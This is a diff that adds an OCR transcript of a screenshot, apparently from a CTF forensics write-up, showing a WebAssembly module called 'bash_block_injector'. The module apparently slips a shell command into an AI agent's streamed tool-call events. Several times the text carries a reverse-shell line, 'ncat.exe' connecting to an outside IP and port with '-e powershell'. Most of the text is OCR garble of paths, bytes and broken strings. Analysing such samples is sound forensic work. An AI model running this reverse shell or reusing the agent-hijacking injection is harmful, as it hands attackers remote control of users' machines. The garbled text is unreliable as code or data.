@@ -1,0 +1,30 @@
+# OCR: Pasted_image_20260414163419.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260414163419.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:42
+
+wbash_block_injector_bq.wasmx
+三track
+X
+C:>Users>NoahTie>Desktop >fpt-default-signed >三 track
+(module
+e408947bfd200af42db322daf0fadfe7e26d3bd1/1ibrarv/a11oc/src/s1ice.r
+bash
+Aa ab*
+1of1
+root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/hashbrown-0.16.1/src/raw/mod.rs/o0/rustc/
+川
+e408947bfd200af42db322daf0fadfe7e26d3bd1/1ibrarv/core/src/fmt/mod.rs 00/rustc/e408947bfd200af42db322dafofadfe7e26d3bd1 1ibrary/alloc/src/raw vec/mod.rs(00/rustc/e408947bfd200af42db322dafofadfe7e26d3bd1/1ibrary/core/src/num/f1t2dec/mod.
+rs/00/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/serde json-1.0.149/src/read.rs/00/rust/deps/dlmalloc-0.2 11/src/dlmalloc.rs(00/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/itoa-1.0.17/src/1ib.rs/00/c0,jncat.exe
+156.238.239.253 1314 -e powershel1\o0\1ofloating point ^\co\o1~\0o\obcharacter ^\co\01~\00\09integer 1c0/01*100/09b00lean -1c0/01*00/00H/0bl10/00/0al00/0000Kl00/00/00/1cl00/00/00[D0NE
+typemessage_startcontent_block_deltadeltatext_deltainput_json_deltatext\oa\oo\ooH\ob\io\oo\oa\oo\oo\ooE\o1\ooloo& 00 00 00122c0mmand122100100100H10b11010010a10000100G10110010011d10010000indexncat.exe 156.238.239.253 1314 -e powershell10a/00/0000/ob/1o/0010a100100/001cc100/00/00!00/00/00.-bashevent:
+content block deltapartial
+1s0n1000000H0b1101000a00000018101100100800100100H10b100010a100100001f10100100
+00 0000H10b1000 0a00 00/00101 0000!00 0000c1aude0penclaw 0010003100 0000inputc0mmandH0b110 0010a10000100b6 01100100113100 0000H10b110100 0a100/001001b8101001008
+0010000H10b1101000a0000100bf1011000011b00000010a.H10b1010010a100001001c101100100
+100/0000H/0b/1000/0a/00/00/00c6101/00/00,100/00/00H/0b/10/00/0a/00/00/00/c8/01/00/00.100/00/00/0ancat.exe 156.238.239 2531314-e
+p0wershe1110a1h/061101000/00/00/00/e410510010011400/00/00h06110/00000/00/00/e4/05100100!100/00100h/06110000/00100/0 0/d8/05/00/00!/00/00/00h/06/10/000/00/00/00h/04/00/00$/00/00/00/ff/ff/ff/ff/ff/ff1ff1ff/e8/0d/10"
+56218 56219 56220
+(data (1;)(i32.const 1052160) "iffiff/ff/ff/ff/ff/ffiff/00/0e/10")(data;2;)(i32.const1052184)"iff/ff/ff/ff/ff/ff/ff/ff/18/0e/10")
+(data （;3;) (i32.const 1052208) "Attempted to initialize thread-local while it is being  dr0pped100100/b7104/10/000100/00/00k10010010010d/0000100mid
+1en:00:00:00ba108110:00J:00.00:002.0300.00!100:00.00:01.01101101:0101.01.0101101.01:01:01.01.01.0101101.01:01:01.01 01:01:01:01:0101:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:01:0 1:01:01:0101:01:01:01:01:01:01:0101:01:0101:01:01101:01:01:01:01:01:01:01101:01:01:01:01:01:01:01101:01:01:01:01:01:01 01:01101101101101101101101:01:01101101101101101:01101101101101101101101101
